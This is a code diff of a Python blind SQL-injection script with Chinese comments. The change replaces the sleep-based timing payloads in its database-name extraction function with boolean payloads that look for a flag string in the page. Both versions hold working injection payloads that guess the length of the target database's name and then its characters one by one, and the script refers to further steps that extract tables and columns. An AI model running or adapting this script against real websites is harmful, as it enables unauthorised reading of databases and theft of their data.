@@ -3,7 +3,6 @@ from ast import parse
 from email.policy import default
 import requests
 import optparse
-import time
 
 #一、定义存储数据库数据的变量和一个request对象用来进行请求
 #存放数据库名的变量
@@ -43,42 +42,35 @@ def StartSqli(url):
             GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])
 
 #三、获取数据库名的函数，根据得到的URL获取数据库名并把最后的结果存入DBName
-# 获取数据库名的函数
 def GetDBName(url):
-    # 引用全局变量DBName，用来存放网页当前使用的数据库名
+    #引用全局变量DBName，用来存放网页当前使用的数据库名
     global DBName
-    print("[-]开始获取数据库名的长度")
-    # 保存数据库名长度的变量
+    print("[-] 开始获取数据库名的长度")
+    #保存数据库名长度的变量
     DBNameLen = 0
-    # 用于检查数据库名长度的payload
-    payload = "' and if(length(database())={0},sleep(5),0) %23"
-    # 把URL和payload进行拼接，得到最终的请求URL
+    #用于检查数据库名长度的payload
+    payload = "' and if(length(database()) = {0},1,0) %23"
+    #把URL和payload进行拼接，得到最终的URL
     targetUrl = url + payload
-    # 用for循环来遍历请求，得到数据库名的长度
-    for DBNameLen in range(1, 99):
-        # 开始时间
-        timeStart = time.time()
-        # 开始访问
+    #用for循环来遍历请求，得到数据库名的长度
+    for DBNameLen in range(1,99):
+        #对payload中的参数进行赋值猜解
         res = conn.get(targetUrl.format(DBNameLen))
-        # 结束时间
-        timeEnd = time.time()
-        # 判断时间差
-        if timeEnd - timeStart >= 5:
-            print("[+]数据库名的长度:" + str(DBNameLen))
+        #判断flag是否存放在返回的页面中
+        if flag in res.content.decode("utf-8"):
+            print("[+] 数据库名的长度：" + str(DBNameLen))
             break
-    print("[-]开始获取数据库名")
-    payload = "' and if(ascii(substr(database(),{0},1))={1},sleep(5),0)%23"
+    print("[-] 开始获取数据库名")
+    payload = "' and if(ascii(substr(database(), {0}, 1)) = {1}, 1, 0) %23"
     targetUrl = url + payload
-    # a表示substr()函数的截取起始位置
-    for a in range(1, DBNameLen+1):
-        # b表示在ASCII码中33～126位可显示的字符
-        for b in range(33, 127):
-            timeStart = time.time()
-            res = conn.get(targetUrl.format(a,b))
-            timeEnd = time.time()
-            if timeEnd - timeStart >= 5:
+    #a表示substr()函数的截取起始位置
+    for a in range(1, DBNameLen + 1):
+        #b表示在ASCII码中33～126位可显示的字符
+        for b in range(33,127):
+            res = conn.get(targetUrl.format(a, b))
+            if flag in res.content.decode("utf-8"):
                 DBName += chr(b)
-                print("[-]"+ DBName)
+                print("[-]" + DBName)
                 break
 
 #四、获取数据库表的函数，根据获取到的URL和数据库名获取数据库中的表，并把结果以列表的形式存入DBTables
